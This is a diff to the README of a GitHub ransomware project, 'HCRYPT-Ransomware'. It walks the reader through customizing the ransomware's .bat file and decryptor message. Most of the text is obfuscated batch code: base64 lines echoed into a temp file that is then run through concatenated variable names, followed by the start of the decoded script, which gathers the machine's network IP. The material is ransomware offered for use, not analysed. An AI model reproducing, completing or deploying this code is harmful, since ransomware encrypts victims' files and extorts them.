@@ -1,7 +1,9 @@
 # HCRYPT-Ransomware
 
 
+
 ![s](https://github.com/Ghost-crypto-exe/HCRYPT-Ransomware/assets/72792767/d30e6e25-e18d-48b5-8b6f-a60d16f6ae6c)
+
 
 
 
@@ -12,6 +14,7 @@ Below you can find steps to make the ransomware your own.
 
 
 [STEP 1]
+
 Inorder to make the file opperational navigate to the downloaded .bat file, open it in notepad or any other text editor. Once open scroll down to the following part in the text and follow the instructions:
 
 
@@ -20,6 +23,7 @@ Inorder to make the file opperational navigate to the downloaded .bat file, open
 Inorder to change the decryptor message navigate to line 15745 and base64 decode the following:
 
 [STEP 2]
+
 ```
 echo QGVjaG8gb2ZmDQpmb3IgL2YgImRlbGltcz1bXSB0b2tlbnM9MiIgJSVhIGluICgn > Do_Not_Delete.tmp & %mtrcpjq%%bjpsfhg%%bjpsfhg%%bhhemjc%%amtbrob%%ztrcpjq%%xtrcpjq%%lmkobld%%btrcpjq%%xtrcpjq%%lmkobld%%algqwon%%xtrcpjq%Do_Not_Delete.tmp
 echo Ml4+TlVMIHBpbmcgLTQgLW4gMSAlQ29tcHV0ZXJOYW1lJSBefCBmaW5kc3RyIFsn >> Do_Not_Delete.tmp
@@ -186,6 +190,7 @@ echo DQpnb3RvIDplb2YNCjplbmQ= >> Do_Not_Delete.tmp
 once decoded you will see the following:
 
 [STEP 3]
+
 ```
 @echo off
 for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
